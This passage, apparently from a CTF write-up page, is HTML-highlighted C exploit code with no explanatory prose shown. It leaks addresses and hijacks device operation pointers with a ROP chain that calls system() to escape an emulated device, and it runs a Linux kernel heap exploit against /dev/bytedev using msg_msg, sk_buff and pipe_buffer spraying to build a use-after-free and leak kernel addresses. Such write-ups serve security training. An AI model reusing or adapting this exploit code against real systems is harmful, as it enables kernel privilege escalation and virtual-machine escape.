class="keyword">uint64_t</span> elf_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x474039</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x2e0250</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_read_addr = elf_base + <span class="number">0x474039</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] process base: \033[0m %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] system addr: \033[0m %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    read(fd, fake_ops, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak heap base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x186</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x2ae00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> parent_object = heap_base + <span class="number">0x9f650</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = heap_base + <span class="number">0x10adc20</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_ops_addr = opaque_addr + <span class="number">0xb68</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap base: \033[0m %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] parent_object addr: \033[0m %p\n&quot;</span>, parent_object);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] opaque addr: \033[0m %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak libc base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-388</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span> * <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x7</span> * <span class="number">8</span>) - <span class="number">0x4385f0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_rsp_rbx = <span class="number">0x5b4d0</span> + libc_base;</span><br><span class="line">    <span class="comment">// mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    <span class="keyword">uint64_t</span> magic_gadget = <span class="number">0x0000000000151990</span> + libc_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] libc base: \033[0m %p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] magic gadget addr: \033[0m %p\n&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;nl flag\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> command_addr = opaque_addr + <span class="number">0xf8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] prepare for hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810, -0x16d);</span></span><br><span class="line">    <span class="comment">// read(fd, buf, 0x200);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x18</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">8</span>) = opaque_addr + <span class="number">0x100</span> - <span class="number">0x20</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe0</span>) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe8</span>) = command_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf0</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf8</span>) = *(<span class="keyword">uint64_t</span> *)command;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = mov_rsp_rbx;</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x108</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x16d</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-6</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops) = pmio_read_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops + <span class="number">8</span>) = magic_gadget;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span> + i * <span class="number">8</span>) = *(<span class="keyword">uint64_t</span> *)(fake_ops + i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] ready to hijack! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-347</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = opaque_addr + <span class="number">0xc28</span>;</span><br><span class="line">    write(fd, buf, <span class="number">0x50</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">0x196082</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810,);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] done! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_qid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">256</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[real_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to release secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="string">&#x27;Z&#x27;</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(oob_msg.mtext, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msg.mtext));</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">704</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)fake_secondary_msg)[i] = victim_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    